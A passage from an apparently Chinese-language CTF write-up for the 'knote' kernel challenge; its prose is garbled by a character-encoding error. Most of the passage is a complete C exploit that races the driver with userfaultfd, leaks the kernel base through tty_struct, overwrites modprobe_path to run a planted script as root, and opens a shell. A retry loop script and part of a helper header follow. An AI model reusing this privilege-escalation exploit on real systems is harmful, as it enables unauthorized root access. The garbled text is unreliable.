id="3-edit">3.edit</h5><p>å°±æ˜¯æ­£å¸¸çš„ç”¨ç»´æŠ¤æ•°ç»„buf[i]å½“å‚æ•°ï¼Œç„¶åç”¨copy_user_generic_unrolledå‡½æ•°æ‹·è´å†…å­˜</p><p>(è¿™ä¸ªå‡½æ•°æ˜¯_copy_to_useræœ€åº•å±‚å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºè¿™æ˜¯ç¼–è¯‘å™¨ä¼˜åŒ–çš„ç»“æœï¼Ÿ)</p><p>å°±æ˜¯åœ¨ç”¨æˆ·ç©ºé—´å¾€å†…æ ¸ç©ºé—´å†™æ•°æ®</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸ªeditæ²¡æœ‰åŠ å†™é”ï¼Œæ‰€ä»¥å­˜åœ¨æ¡ä»¶ç«äº‰</p><h5 id="4-get">4.get</h5><p>è¿™é‡Œä¹Ÿæ²¡åŠ å†™é”</p><p>ä¸editä½œç”¨ç›¸åï¼Œä»å†…æ ¸ç©ºé—´å‘ç”¨æˆ·ç©ºé—´å†™æ•°æ®</p><h4 id="0x02åˆ©ç”¨æ–¹æ³•">0x02åˆ©ç”¨æ–¹æ³•</h4><h5 id="1-UserFaultFdæ¡ä»¶ç«äº‰">1.UserFaultFdæ¡ä»¶ç«äº‰</h5><p>åœ¨çˆ¶è¿›ç¨‹å¯¹getä½¿ç”¨UserFaultFdï¼Œæ¥æ¡ä»¶ç«äº‰ï¼Œåœ¨çˆ¶è¿›ç¨‹ä½¿geté˜»å¡æ—¶ï¼Œå­è¿›ç¨‹é‡Šæ”¾objectï¼Œåˆ†é…åˆ°tty_structï¼Œä»¥æ³„éœ²å†…æ ¸åŸºå€</p><h5 id="2-åŠ«æŒmodprobe-path">2.åŠ«æŒmodprobe_path</h5><p>åœ¨çˆ¶è¿›ç¨‹å¯¹editä½¿ç”¨UserFaultFdï¼Œæ¥æ¡ä»¶ç«äº‰ï¼ŒåŠ«æŒ freelist ä»è€Œæ„é€ å†…æ ¸ä»»æ„åœ°å€å†™ï¼ŒåŠ«æŒcall_modprobe()ä¸­çš„modprobe_pathä¸ºæˆ‘ä»¬çš„æ¶æ„ç¨‹åºï¼ˆ/getshellï¼‰ï¼Œç”¨execveæ‰§è¡Œéæ³•æ–‡ä»¶ï¼Œè§¦å‘ä»¥rootæƒé™æ‰§è¡Œæ¥cat flag å¹¶èµ·ä¸€ä¸ªshell</p><h4 id="0x03Exp">0x03Exp</h4><p>åŸºæœ¬ä¸Šæ˜¯è·Ÿç€<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#%E4%BE%8B%E9%A2%98%EF%BC%9AD-3CTF2019-knote">arttnba3</a>å¸ˆå‚…çš„expæ‰“äº†ä¸€é</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DO_SAK_WORK 0xffffffff815d4ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MODPROBE_PATH 0xffffffff8245c5c0</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> cat_flag[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><span class="hljs-type">int</span> knote_fd;<br><span class="hljs-type">size_t</span> modprobe_path;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-type">size_t</span> size;<br>        <span class="hljs-type">size_t</span> index;<br>    &#125;;<br>    <span class="hljs-type">char</span> * buf;<br>&#125; Chunk;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">chunkAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>&#123;<br>    Chunk chunk=&#123;<br>        .size=size,<br>    &#125;;<br>    ioctl(knote_fd,<span class="hljs-number">0x1337</span>,&amp;chunk);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">chunkEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index, <span class="hljs-type">char</span> * buf)</span>&#123;<br>    Chunk chunk=&#123;<br>        .index=index,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(knote_fd,<span class="hljs-number">0x8888</span>,&amp;chunk);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">chunkGet</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index,<span class="hljs-type">char</span> *buf)</span>&#123;<br>    Chunk chunk=&#123;<br>        .index=index,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(knote_fd,<span class="hljs-number">0x2333</span>,&amp;chunk);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">chunkDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index)</span>&#123;<br>    Chunk chunk=&#123;<br>        .index=index,<br>    &#125;;<br>    ioctl(knote_fd,<span class="hljs-number">0x6666</span>,&amp;chunk);<br>&#125;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>; <br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> * buf1;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> * buf2;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        sleep(<span class="hljs-number">8</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-comment">// create reverse shell file</span><br>    fd = open(<span class="hljs-string">&quot;/getshell&quot;</span>, O_RDWR | O_CREAT);<br>    write(fd, cat_flag, <span class="hljs-keyword">sizeof</span>(cat_flag));<br>    close(fd);<br>    system(<span class="hljs-string">&quot;chmod +x /getshell&quot;</span>);<br><br>    saveStatus();<br>    page_size=sysconf(_SC_PAGE_SIZE);<br>    sleep(<span class="hljs-number">1</span>);<br>    buf1=mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    buf2=mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (buf1 == MAP_FAILED)<br>        errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    registerUserFaultFd(buf1, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br>    registerUserFaultFd(buf2, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    knote_fd=open(<span class="hljs-string">&quot;/dev/knote&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(knote_fd&lt;<span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;Open knote Failed!&quot;</span>);<br>    <span class="hljs-comment">// read saved data(if existed)</span><br>    fd = open(<span class="hljs-string">&quot;kernel_addr.txt&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (fd &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        close(fd);<br>        FILE* file = fopen(<span class="hljs-string">&quot;/kernel_addr.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-keyword">if</span> (file)<br>        &#123;<br>            <span class="hljs-built_in">fscanf</span>(file, <span class="hljs-string">&quot;%llx %llx&quot;</span>, &amp;kernel_base, &amp;kernel_offset);<br>            <span class="hljs-keyword">goto</span> exploit;<br>        &#125;<br>    &#125;<br>    <br>    chunkAdd(TTY_STRUCT_SIZE);<br>    <span class="hljs-type">pid_t</span> fpid = fork();<br>    <span class="hljs-keyword">if</span> (fpid&lt;<span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;Fork child Failed!&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(fpid==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is a child process!&quot;</span>);<br>        sleep(<span class="hljs-number">2</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;child start&quot;</span>);<br>        chunkDel(<span class="hljs-number">0</span>);<br>        sleep(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">int</span> fd_tty = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Object free and tty got open. Backing parent thread...&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is a parent process!&quot;</span>);<br>        chunkGet(<span class="hljs-number">0</span>,buf1);<span class="hljs-comment">//Pause here,waitting </span><br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">0x2e0</span>/<span class="hljs-number">8</span>;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[leak_data]: %d : %p\n&quot;</span>,i,*((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(buf1)+i));<br>        <br>    <span class="hljs-keyword">if</span> (*(buf1+<span class="hljs-number">86</span>))<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Successfully leak!&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        errExit(<span class="hljs-string">&quot;Fail to leak&quot;</span>);<br>    <br>    kernel_offset=*((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(buf1)+<span class="hljs-number">86</span>)-DO_SAK_WORK;<br>    kernel_base=(<span class="hljs-type">void</span>*)((<span class="hljs-type">size_t</span>)kernel_base+kernel_offset);<br>    FILE* file = fopen(<span class="hljs-string">&quot;/kernel_addr.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!file)<br>        errExit(<span class="hljs-string">&quot;Fail to create kernel_addr.txt!&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(file, <span class="hljs-string">&quot;%llx %llx&quot;</span>, kernel_base, kernel_offset);<br>    fclose(file);<br>    <br>exploit:<br>    modprobe_path=MODPROBE_PATH+kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Kernel offset: 0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel base: %p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] modprobe_path: %p\n&quot;</span>, modprobe_path);<br><br>    <span class="hljs-comment">//hijack modprobe_path</span><br>    chunkAdd(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(page,&amp;modprobe_path,<span class="hljs-number">8</span>);<span class="hljs-comment">//object-&gt;next</span><br>    <span class="hljs-comment">//memcpy(((unsigned long long*)(page) + 1), &quot;whatwhat&quot;, 8);</span><br>    <span class="hljs-type">pid_t</span> pid=fork();<br>    <span class="hljs-keyword">if</span> (pid&lt;<span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;Fork child Failed!&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process sleeping now...&quot;</span>);<br>        sleep(<span class="hljs-number">2</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process started.&quot;</span>);<br>        chunkDel(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Object free . Backing parent thread...&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Parent process trapped in userfaultfd again...&quot;</span>);<br>        chunkEdit(<span class="hljs-number">0</span>,buf2);<br>    &#125;<br>    <span class="hljs-comment">//hijack the modprobe_path</span><br>    chunkAdd(<span class="hljs-number">0x100</span>);<br>    chunkAdd(<span class="hljs-number">0x100</span>);<br><br>    chunkEdit(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;/getshell&quot;</span>);<br><br>    <span class="hljs-comment">//trigger the modprobe_path</span><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/fake&quot;</span>);<br>    <br>    <span class="hljs-comment">// get flag</span><br>    sleep(<span class="hljs-number">1</span>);<br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to hijack!&quot;</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">0x100</span>];<br>    read(fd, flag, <span class="hljs-number">0x100</span>);<br>    write(<span class="hljs-number">1</span>, flag, <span class="hljs-number">0x100</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†å¤±è´¥æ¦‚ç‡ä¹Ÿå¾ˆé«˜ï¼Œæ•´ä¸ªå¾ªç¯è„šæœ¬ä¸€ç›´æµ‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>while true<br>do<br>    ./exp<br>done<br></code></pre></td></tr></table></figure><p>ä»¥rootæƒé™æ‰§è¡Œæ¶æ„æ–‡ä»¶ï¼Œç»™flagæ–‡ä»¶åŠ chmod 777,å¦èµ·ä¸€ä¸ªshell</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6-1684499662255.png" alt="6"></p><p>UserFaultFdå¯ä»¥æ¨¡æ¿å¥—ä¸€ä¸‹,<code>registerUserFaultFd(addr, len, handler);</code> handlerçš„å†™æ³•ä¹Ÿå¥—ä¸€ä¸‹æ¨¡æ¿</p><p>è¿™ä¸ªæ˜¯arttnba3å¸ˆå‚…å°è£…çš„å¤´æ–‡ä»¶kernel.hï¼Œæœ‰ä¸€äº›kernel pwnä¸­å¸¸ç”¨çš„ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span 